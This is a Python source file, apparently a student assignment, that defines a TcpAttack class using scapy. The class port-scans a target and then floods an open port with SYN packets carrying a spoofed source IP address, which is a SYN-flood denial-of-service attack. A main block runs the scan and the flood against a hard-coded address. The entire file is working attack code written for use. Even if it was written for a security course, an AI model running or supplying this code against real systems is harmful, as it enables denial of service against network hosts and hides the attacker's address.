# Name: Dionysius Xaverio

import sys
import os
import socket
from scapy.all import *

class TcpAttack:
    def __init__(self, spoofIP:str, targetIP:str)->None:
        # spoofIP : String containing the IP address to spoof
        self.spoofIP = spoofIP
        self.targetIP = socket.gethostbyname(targetIP)

    def scanTarget(self, rangeStart, rangeEnd):
        # rangeStart : Integer designating the first port in the range of ports being scanned
        # rangeEnd : Integer designating the last port in the range of ports being scanned
        # return value : no return value , however , writes open ports to openports.txt
        portsOpen = []
        portsFound = 0
        outfile = open('openports.txt', 'w')

        for i in range(rangeStart, rangeEnd + 1):
            portAttempted = i

            clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            clientSocket.settimeout(.1) 

            result = clientSocket.connect_ex((self.targetIP, portAttempted))

            if result == 0:
                portsOpen.append(portAttempted)
                portsFound += 1

        for j in range(portsFound):
            outfile.write(str(portsOpen[j]))
            if j < (portsFound - 1): 
                outfile.write('\n')

        outfile.close()


    def attackTarget(self, port:int, numSyn:int)->int:
        # port : integer designating the port that the attack will use
        # numSyn : Integer of Syn packets to send to target IP address at the given port
        # If the port is open , perform a DoS attack and return 1. Otherwise return 0

        clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        clientSocket.settimeout(.1)  

        result = clientSocket.connect_ex((self.targetIP, port))

        if result != 0: 
            return 0

        for i in range(0, numSyn):

            ipHead = IP(src=self.spoofIP, dst=self.targetIP) 
            tcpHead = TCP(flags="S", sport=RandShort(), dport=port) 
            synPacket = ipHead / tcpHead 
            try:
                send(synPacket)
            except Exception as e:
                print(e) 

        return 1


if __name__ == "__main__":
    spoofIP = '123.45.67.89'
    targetIP = '192.168.1.68'
    port = 119
    numSyn = 100
    tcp = TcpAttack(spoofIP, targetIP)
    tcp.scanTarget(0,115)
    if tcp.attackTarget(port, numSyn):
        print(f"Port {port} was open, and flooded with {numSyn} SYN packets")
